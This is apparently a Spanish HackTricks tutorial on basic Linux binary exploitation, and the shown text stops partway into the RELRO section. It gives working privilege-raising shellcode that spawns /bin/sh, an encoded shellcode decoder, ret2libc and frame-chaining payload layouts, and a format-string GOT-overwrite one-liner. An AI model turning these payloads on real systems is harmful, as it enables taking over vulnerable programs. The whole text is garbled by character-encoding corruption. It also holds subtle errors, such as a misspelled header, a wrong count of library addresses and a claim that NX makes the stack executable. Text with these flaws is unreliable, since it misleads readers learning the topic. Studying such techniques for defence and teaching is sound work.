# Explotaci√≥n de Linux (B√°sico)

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipos Rojos de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **1. DESBORDAMIENTOS DE PILA**

> desbordamiento de b√∫fer, sobrecarga de b√∫fer, sobrecarga de pila, aplastamiento de pila

Fallo de segmentaci√≥n o violaci√≥n de segmento: Cuando se intenta acceder a una direcci√≥n de memoria que no ha sido asignada al proceso.

Para obtener la direcci√≥n de una funci√≥n dentro de un programa se puede hacer:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Llamada a sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

View kernel interrupts: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; clear eax\
xor ebx, ebx ; ebx = 0 as there are no arguments to pass\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Execute syscall

**nasm -f elf assembly.asm** ‚Äî> Returns a .o file\
**ld assembly.o -o shellcodeout** ‚Äî> Generates an executable with the assembly code and we can extract the opcodes with **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> To verify that it is indeed our shellcode and extract the OpCodes

**Verify that the shellcode works**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Para confirmar que las llamadas al sistema se realizan correctamente, compile el programa anterior y verifique las llamadas del sistema con **strace ./PROGRAMA\_COMPILADO**

Cuando se crean shellcodes, se puede utilizar un truco. La primera instrucci√≥n es un salto a una llamada. La llamada ejecuta el c√≥digo original y coloca el EIP en la pila. Despu√©s de la instrucci√≥n de llamada, se coloca la cadena necesaria, de modo que con ese EIP se puede apuntar a la cadena y continuar ejecutando el c√≥digo.

EJ **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ usando el Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Buscador de Egg:**

Es un peque√±o c√≥digo que recorre las p√°ginas de memoria asociadas a un proceso en busca de la shellcode guardada all√≠ (busca alguna firma puesta en la shellcode). √ötil en los casos en los que solo se tiene un peque√±o espacio para inyectar c√≥digo.

**Shellcodes Polim√≥rficos**

Son shells cifrados que contienen un peque√±o c√≥digo que los descifra y salta a √©l, utilizando el truco de Call-Pop, aqu√≠ hay un **ejemplo cifrado C√©sar**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
1. **Atacando el Frame Pointer (EBP)**

√ötil en una situaci√≥n en la que podemos modificar el EBP pero no el EIP.

Se sabe que al salir de una funci√≥n se ejecuta el siguente c√≥digo ensamblador:
```
movl               %ebp, %esp
popl                %ebp
ret
```
De esta forma, si se puede modificar el EBP al salir de una funci√≥n (fvuln) que ha sido llamada por otra funci√≥n, cuando la funci√≥n que llam√≥ a fvuln finalice, su EIP puede ser modificado.

En fvuln se puede introducir un EBP falso que apunte a un sitio donde est√© la direcci√≥n de la shellcode + 4 (hay que sumarle 4 por el pop). As√≠, al salir de la funci√≥n, se meter√° en ESP el valor de &(\&Shellcode)+4, con el pop se le restar√° 4 al ESP y este apuntar√° a la direcci√≥n de la shellcode cuando se ejecute el ret.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + relleno + &(\&Shellcode)+4

**Off-by-One Exploit**\
Se permite modificar tan solo el byte menos significativo del EBP. Se puede llevar a cabo un ataque como el anterior pero la memoria que guarda la direcci√≥n de la shellcode debe compartir los 3 primeros bytes con el EBP.

## **4. M√©todos return to Libc**

M√©todo √∫til cuando el stack no es ejecutable o deja un buffer muy peque√±o para modificar.

El ASLR provoca que en cada ejecuci√≥n las funciones se carguen en posiciones distintas de la memoria. Por lo tanto este m√©todo puede no ser efectivo en ese caso. Para servidores remotos, como el programa est√° siendo ejecutado constantemente en la misma direcci√≥n s√≠ puede ser √∫til.

* **cdecl(C declaration)** Mete los argumentos en el stack y tras salir de la funci√≥n limpia la pila
* **stdcall(standard call)** Mete los argumentos en la pila y es la funci√≥n llamada la que la limpia
* **fastcall** Mete los dos primeros argumentos en registros y el resto en la pila

Se pone la direcci√≥n de la instrucci√≥n system de libc y se le pasa como argumento el string ‚Äú/bin/sh‚Äù, normalmente desde una variable de entorno. Adem√°s, se usa la direcci√≥n a la funci√≥n exit para que una vez que no se requiera m√°s la shell, salga el programa sin dar problemas (y escribir logs).

**export SHELL=/bin/sh**

Para encontrar las direcciones que necesitaremos se puede mirar dentro de **GDB:**\
**p system**\
**p exit**\
**rabin2 -i ejecutable** ‚Äî> Da la direcci√≥n de todas las funciones que usa el programa al cargarse\
(Dentro de un start o algun breakpoint): **x/500s $esp** ‚Äî> Buscamos dentro de aqui el string /bin/sh

Una vez tengamos estas direcciones el **exploit** quedar√≠a:

‚ÄúA‚Äù \* DISTANCIA EBP + 4 (EBP: pueden ser 4 "A"s aunque mejor si es el EBP real para evitar fallos de segmentaci√≥n) + Direcci√≥n de **system** (sobreescribir√° el EIP) + Direcci√≥n de **exit** (al salir de system(‚Äú/bin/sh‚Äù) se llamar√° a esta funci√≥n pues los primero 4bytes del stack son tratados como la siguiente direcci√≥n del EIP a ejecutar) + Direcci√≥n de ‚Äú**/bin/sh**‚Äù (ser√° el par√°metro pasado a system)

De esta forma el EIP se sobreescribir√° con la direcci√≥n de system la cual recibir√° como par√°metro el string ‚Äú/bin/sh‚Äù y al salir de este ejecutar√° la funci√≥n exit().

Es posible encontrarse en la situaci√≥n de que alg√∫n byte de alguna direcci√≥n de alguna funci√≥n sea nulo o espacio (\x20). En ese caso se pueden desensamblar las direcciones anteriores a dicha funci√≥n pues probablemente haya varios NOPs que nos permitan poder llamar a alguno de ellos en vez de a la funci√≥n directamente (por ejemplo con > x/8i system-4).

Este m√©todo funciona pues al llamar a una funci√≥n como system usando el opcode **ret** en vez de **call**, la funci√≥n entiende que los primeros 4bytes ser√°n la direcci√≥n **EIP** a la que volver.

Una t√©cnica interesante con este m√©todo es el llamar a **strncpy()** para mover un payload del stack al heap y posteriormente usar **gets()** para ejecutar dicho payload.

Otra t√©cnica interesante es el uso de **mprotect()** la cual permite asignar los permisos deseados a cualquier parte de la memoria. Sirve o serv√≠a en BDS, MacOS y OpenBSD, pero no en linux(controla que no se puedan otorgar a la vez permisos de escritura y ejecuci√≥n). Con este ataque se podr√≠a volver a configurar la pila como ejecutable.

**Encadenamiento de funciones**

Bas√°ndonos en la t√©cnica anterior, esta forma de exploit consiste en:\
Relleno + \&Funci√≥n1 + \&pop;ret; + \&arg\_fun1 + \&Funci√≥n2 + \&pop;ret; + \&arg\_fun2 + ‚Ä¶

De esta forma se pueden encadenar funciones a las que llamar. Adem√°s, si se quieren usar funciones con varios argumentos, se pueden poner los argumentos necesarios (ej 4) y poner los 4 argumentos y buscar direcci√≥n a un sitio con opcodes: pop, pop, pop, pop, ret ‚Äî> **objdump -d ejecutable**

**Encadenamiento mediante falseo de frames (encadenamiento de EBPs)**

Consiste en aprovechar el poder manipular el EBP para ir encadenando la ejecuci√≥n de varias funciones a trav√©s del EBP y de "leave;ret"

RELLENO

* Situamos en el EBP un EBP falso que apunta a: 2¬∫ EBP\_falso + la funci√≥n a ejecutar: (\&system() + \&leave;ret + &‚Äú/bin/sh‚Äù)
* En el EIP ponemos de direcci√≥n una funci√≥n &(leave;ret)

Iniciamos la shellcode con la direcci√≥n a la siguiente parte de la shellcode, por ej: 2¬∫EBP\_falso + \&system() + &(leave;ret;) + &‚Äù/bin/sh‚Äù

el 2¬∫EBP ser√≠a: 3¬∫EBP\_falso + \&system() + &(leave;ret;) + &‚Äù/bin/ls‚Äù

Esta shellcode se puede repetir indefinidamente en las partes de memoria a las que se tenga acceso de forma que se conseguir√° una shellcode f√°cilmente divisible por peque√±os trozos de memoria.

(Se encadena la ejecuci√≥n de funciones mezclando las vulnerabilidades vistas anteriormente de EBP y de ret2lib)

## **5.M√©todos complementarios**

**Ret2Ret**

√ötil para cuando no se puede meter una direcci√≥n del stack en el EIP (se comprueba que el EIP no contenga 0xbf) o cuando no se puede calcular la ubicaci√≥n de la shellcode. Pero, la funci√≥n vulnerable acepte un par√°metro (la shellcode ir√° aqu√≠).

De esta forma, al cambiar el EIP por una direcci√≥n a un **ret**, se cargar√° la siguiente direcci√≥n (que es la direcci√≥n del primer argumento de la funci√≥n). Es decir, se cargar√° la shellcode.

El exploit quedar√≠a: SHELLCODE + Relleno (hasta EIP) + **\&ret** (los siguientes bytes de la pila apuntan al inicio de la shellcode pues se mete en el stack la direcci√≥n al par√°metro pasado)

Al parecer funciones como **strncpy** una vez completas eliminan de la pila la direcci√≥n donde estaba guardada la shellcode imposibilitando esta t√©cnica. Es decir, la direcci√≥n que pasan a la funci√≥n como argumento (la que guarda la shellcode) es modificada por un 0x00 por lo que al llamar al segundo **ret** se encuentra con un 0x00 y el programa muere.
```
**Ret2PopRet**
```
Si no tenemos control sobre el primer argumento pero s√≠ sobre el segundo o el tercero, podemos sobreescribir EIP con una direcci√≥n a pop-ret o pop-pop-ret, seg√∫n la que necesitemos.

**T√©cnica de Murat**

En linux todos los progamas se mapean comenzando en 0xbfffffff

Viendo como se construye la pila de un nuevo proceso en linux se puede desarrollar un exploit de forma que programa sea arrancado en un entorno cuya √∫nica variable sea la shellcode. La direcci√≥n de esta entonces se puede calcular como: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

De esta forma se obtendr√≠a de forma sensilla la direcci√≥n donde est√° la variable de entorno con la shellcode.

Esto se puede hacer gracias a que la funci√≥n execle permite crear un entorno que solo tenga las variables de entorno que se deseen

**Jump to ESP: Windows Style**

Debido a que el ESP est√° apuntando al comienzo del stack siempre, esta t√©cnica consiste con sustituir el EIP con la direcci√≥n a una llamada a **jmp esp** o **call esp**. De esta forma, se guarda la shellcode despu√©s de la sobreescritura del EIP ya que despu√©s de ejecutar el **ret** el ESP se encontrar√° apuntando a la direcci√≥n siguiente, justo donde se ha guardado la shellcode.

En caso de que no se tenga el ASLR activo en Windows o Linux se puede llamar a **jmp esp** o **call esp** almacenadas en alg√∫n objeto compartido. En caso de que est√© el ASLR, se podr√≠a buscar dentro del propio programa vulnerable.

Adem√°s, el hecho de poder colocar la shellcode despu√©s de la corrupci√≥n del EIP en vez de en medio del stack, permite que las instrucciones push o pop que se ejecuten en medio de la funci√≥n no lleguen a tocar la shellcode (cosa que podr√≠a ocurrir en caso de ponerse en medio del stack de la funci√≥n).

De forma muy similar a esto si sabemos que una funci√≥n devuelve la direcci√≥n donde est√° guardada la shellcode se puede llamar a **call eax** o **jmp eax (ret2eax).**

**Integer overflows**

Este tipo de overflows se producen cuando una variable no est√° preparada para soportar un n√∫mero tan grande como se le pasa, posiblemente por una confusi√≥n entre variables con y sin signo, por ejemplo:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
En el ejemplo anterior vemos que el programa se espera 2 par√°metros. El primero la longitud de la siguiente cadena y el segundo la cadena.

Si le pasamos como primer par√°metro un n√∫mero negativo saldr√° que len < 256 y pasaremos ese filtro, y adem√°s tambi√©n strlen(buffer) ser√° menor que l, pues l es unsigned int y ser√° muy grande.

Este tipo de overflows no busca lograr escribir algo en el proceso del programa, sino superar filtros mal dise√±ados para explotar otras vulnerabilidades.

**Variables no inicializadas**

No se sabe el valor que puede tomar una variable no inicializada y podr√≠a ser interesante observarlo. Puede ser que tome el valor que tomaba una variable de la funci√≥n anterior y esta sea controlada por el atacante.

## **Format Strings**

En C **`printf`** es una funci√≥n que se puede utilizar para **imprimir** una cadena. El **primer par√°metro** que esta funci√≥n espera es el **texto sin formato con los formateadores**. Los **par√°metros siguientes** esperados son los **valores** para **sustituir** los **formateadores** del texto sin formato.

La vulnerabilidad aparece cuando un **texto del atacante se coloca como el primer argumento** de esta funci√≥n. El atacante podr√° crear una **entrada especial abusando** de las capacidades de **formato de cadena printf** para **escribir cualquier dato en cualquier direcci√≥n**. De esta manera, podr√° **ejecutar c√≥digo arbitrario**.

Formateadores:
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
**`%n`** **escribe** el **n√∫mero de bytes escritos** en la **direcci√≥n indicada. Escribir** tantos **bytes** como el n√∫mero hexadecimal que necesitamos **escribir** es la forma en que se puede **escribir cualquier dato**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Tabla de Enlace de Procedimientos)

Esta es la tabla que contiene la **direcci√≥n** de las **funciones externas** utilizadas por el programa.

Obt√©n la direcci√≥n de esta tabla con: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

Observa c√≥mo despu√©s de **cargar** el **ejecutable** en GEF puedes **ver** las **funciones** que est√°n en el **GOT**: `gef‚û§ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

Usando GEF puedes **iniciar** una **sesi√≥n de depuraci√≥n** y ejecutar **`got`** para ver la tabla got:

![](<../../.gitbook/assets/image (621).png>)

En un binario, el GOT tiene las **direcciones de las funciones o** de la secci√≥n **PLT** que cargar√° la direcci√≥n de la funci√≥n. El objetivo de este exploit es **sobrescribir la entrada del GOT** de una funci√≥n que se ejecutar√° m√°s adelante **con** la **direcci√≥n** de la PLT de la funci√≥n **`system`**. Idealmente, se **sobrescribir√°** el **GOT** de una **funci√≥n** que **ser√° llamada con par√°metros controlados por ti** (as√≠ podr√°s controlar los par√°metros enviados a la funci√≥n del sistema).

Si **`system`** **no se utiliza** en el script, la funci√≥n del sistema **no** tendr√° una entrada en el GOT. En este escenario, necesitar√°s **filtrar primero la direcci√≥n** de la funci√≥n `system`.

La **Tabla de Enlace de Procedimientos** es una tabla de solo lectura en el archivo ELF que almacena todos los **s√≠mbolos necesarios que necesitan una resoluci√≥n**. Cuando se llama a una de estas funciones, el **GOT** **redirigir√°** el **flujo** al **PLT** para que pueda **resolver** la **direcci√≥n** de la funci√≥n y escribirla en el GOT.\
Luego, la **pr√≥xima vez** que se realice una llamada a esa direcci√≥n, la **funci√≥n** se **llamar√° directamente** sin necesidad de resolverla.

Puedes ver las direcciones de PLT con **`objdump -j .plt -d ./vuln_binary`**

### **Flujo de Explotaci√≥n**

Como se explic√≥ anteriormente, el objetivo ser√° **sobrescribir** la **direcci√≥n** de una **funci√≥n** en la tabla **GOT** que se llamar√° m√°s adelante. Idealmente podr√≠amos establecer la **direcci√≥n de un shellcode** ubicado en una secci√≥n ejecutable, pero es muy probable que no puedas escribir un shellcode en una secci√≥n ejecutable.\
Entonces, una opci√≥n diferente es **sobrescribir** una **funci√≥n** que **recibe** sus **argumentos** del **usuario** y **apuntarla** a la funci√≥n **`system`**.

Para escribir la direcci√≥n, generalmente se realizan 2 pasos: **primero escribes 2 bytes** de la direcci√≥n y luego los otros 2. Para hacerlo se utiliza **`$hn`**.

**HOB** se refiere a los 2 bytes m√°s altos de la direcci√≥n\
**LOB** se refiere a los 2 bytes m√°s bajos de la direcci√≥n

Entonces, debido a c√≥mo funciona la cadena de formato, necesitas **escribir primero el m√°s peque√±o** de \[HOB, LOB] y luego el otro.

Si HOB < LOB\
`[direcci√≥n+2][direcci√≥n]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Si HOB > LOB\
`[direcci√≥n+2][direcci√≥n]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 N¬∫Param\_dir\_HOB LOB\_shell-HOB\_shell N¬∫Param\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Plantilla de Explotaci√≥n de Cadena de Formato**

Puedes encontrar una **plantilla** para explotar el GOT usando cadenas de formato aqu√≠:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

B√°sicamente, esta es una estructura con **funciones que se llamar√°n** antes de que el programa finalice. Esto es interesante si puedes llamar a tu **shellcode simplemente saltando a una direcci√≥n**, o en casos en los que necesitas volver a main nuevamente para **explotar la cadena de formato una segunda vez**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Ten en cuenta que esto **no** crear√° un **bucle eterno** porque cuando regreses a la funci√≥n principal, el canario lo notar√°, el final de la pila podr√≠a estar corrompido y la funci√≥n no se volver√° a llamar. Por lo tanto, con esto podr√°s **tener 1 ejecuci√≥n m√°s** de la vulnerabilidad.

### **Formatear cadenas para volcar contenido**

Una cadena de formato tambi√©n puede ser abusada para **volcar contenido** de la memoria del programa.\
Por ejemplo, en la siguiente situaci√≥n hay una **variable local en la pila que apunta a una bandera**. Si **encuentras** en qu√© **direcci√≥n de memoria** est√° el **puntero** a la **bandera**, puedes hacer que **printf acceda** a esa **direcci√≥n** e **imprima** la **bandera**:

Entonces, la bandera est√° en **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Y a partir de la fuga puedes ver que el **puntero a la bandera** est√° en el **8vo** par√°metro:

![](<../../.gitbook/assets/image (623).png>)

Por lo tanto, **accediendo** al **8vo par√°metro** puedes obtener la bandera:

![](<../../.gitbook/assets/image (624).png>)

Ten en cuenta que siguiendo el **exploit anterior** y d√°ndote cuenta de que puedes **filtrar contenido**, puedes **establecer punteros** a **`printf`** en la secci√≥n donde se **carga** el **ejecutable** y **volcarlo** **completamente**!

### **DTOR**

{% hint style="danger" %}
Hoy en d√≠a es muy **raro encontrar un binario con una secci√≥n dtor**.
{% endhint %}

Los destructores son funciones que se **ejecutan antes de que el programa finalice**.\
Si logras **escribir** una **direcci√≥n** a un **shellcode** en **`__DTOR_END__`**, eso se **ejecutar√°** antes de que el programa termine.\
Obt√©n la direcci√≥n de esta secci√≥n con:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
Generalmente encontrar√°s la secci√≥n **DTOR** **entre** los valores `ffffffff` y `00000000`. Por lo tanto, si solo ves esos valores, significa que **no hay ninguna funci√≥n registrada**. Por lo tanto, **sobrescribe** el **`00000000`** con la **direcci√≥n** del **shellcode** para ejecutarlo.

### **Cadenas de formato para desbordamientos de b√∫fer**

La funci√≥n **sprintf** mueve una cadena formateada a una variable. Por lo tanto, podr√≠as abusar del formateo de una cadena para causar un desbordamiento de b√∫fer en la variable donde se copia el contenido.\
Por ejemplo, la carga √∫til `%.44xAAAA` escribir√° 44B+"AAAA" en la variable, lo que puede causar un desbordamiento de b√∫fer.

### **Estructuras \_\_atexit**

{% hint style="danger" %}
Hoy en d√≠a es muy **raro explotar esto**.
{% endhint %}

**`atexit()`** es una funci√≥n a la que se le pasan otras funciones como par√°metros. Estas funciones se ejecutar√°n al ejecutar un **`exit()`** o al retornar del **main**.\
Si puedes **modificar** la **direcci√≥n** de alguna de estas **funciones** para que apunte a un shellcode, por ejemplo, obtendr√°s el **control** del **proceso**, pero actualmente esto es m√°s complicado.\
Actualmente, las **direcciones de las funciones** a ejecutar est√°n ocultas detr√°s de varias estructuras y finalmente la direcci√≥n a la que apuntan no son las direcciones de las funciones, sino que est√°n **encriptadas con XOR** y desplazamientos con una **clave aleatoria**. Por lo tanto, actualmente este vector de ataque no es muy √∫til al menos en x86 y x64\_86.\
La funci√≥n de **encriptaci√≥n** es **`PTR_MANGLE`**. **Otras arquitecturas** como m68k, mips32, mips64, aarch64, arm, hppa... **no implementan la funci√≥n de encriptaci√≥n** porque **devuelven lo mismo** que recibieron como entrada. Por lo tanto, estas arquitecturas podr√≠an ser atacadas por este vector.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Hoy en d√≠a es muy **raro explotar esto**.
{% endhint %}

**`Setjmp()`** permite **guardar** el **contexto** (los registros)\
**`longjmp()`** permite **restaurar** el **contexto**.\
Los registros guardados son: `EBX, ESI, EDI, ESP, EIP, EBP`\
Lo que sucede es que EIP y ESP son pasados por la funci√≥n **`PTR_MANGLE`**, por lo que las **arquitecturas vulnerables a este ataque son las mismas que las mencionadas anteriormente**.\
Son √∫tiles para la recuperaci√≥n de errores o interrupciones.\
Sin embargo, por lo que he le√≠do, los otros registros no est√°n protegidos, por lo que si hay un `call ebx`, `call esi` o `call edi` dentro de la funci√≥n llamada, se puede tomar el control. O tambi√©n se podr√≠a modificar EBP para modificar ESP.

**VTable y VPTR en C++**

Cada clase tiene una **Vtable** que es un array de **punteros a m√©todos**.

Cada objeto de una **clase** tiene un **VPtr** que es un **puntero** al array de su clase. El VPtr es parte del encabezado de cada objeto, por lo que si se logra **sobrescribir** el **VPtr**, se podr√≠a **modificar** para **apuntar** a un m√©todo ficticio para que al ejecutar una funci√≥n vaya al shellcode.

## **Medidas preventivas y evasiones**

**Return-into-printf**

Es una t√©cnica para convertir un desbordamiento de b√∫fer en un error de cadena de formato. Consiste en sustituir el EIP para que apunte a un printf de la funci√≥n y pasarle como argumento una cadena de formato manipulada para obtener valores sobre el estado del proceso.

**Ataque a librer√≠as**

Las librer√≠as est√°n en una posici√≥n con 16bits de aleatoriedad = 65636 posibles direcciones. Si un servidor vulnerable llama a fork() el espacio de direcciones de memoria es clocado en el proceso hijo y se mantiene intacto. Por lo que se puede intentar hacer un brute force a la funci√≥n usleep() de libc pas√°ndole como argumento ‚Äú16‚Äù de forma que cuando tarde m√°s de lo normal en responder se habr√° encontrado dicha funci√≥n. Sabiendo d√≥nde est√° dicha funci√≥n se puede obtener delta\_mmap y calcular las dem√°s.

La √∫nica forma de estar seguros de que el ASLR funciona es usando arquitectura de 64bits. Ah√≠ no hay ataques de fuerza bruta.

### Relro

**Relro (Read only Relocation)** afecta los permisos de memoria de manera similar a NX. La diferencia es que mientras con NX hace que la pila sea ejecutable, RELRO hace que **ciertas cosas sean de solo lectura** por lo que no podemos escribir en ellas. La forma m√°s com√∫n en la que he visto que esto sea un obst√°culo es evitando que hagamos una **sobrescritura de la tabla `got`**, que se cubrir√° m√°s adelante. La tabla `got` contiene direcciones de funciones de libc para que el binario sepa cu√°les son las direcciones y pueda llamarlas. Veamos c√≥mo son los permisos de memoria para una entrada de la tabla `got` para un binario con y sin relro.

Con relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Sin relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
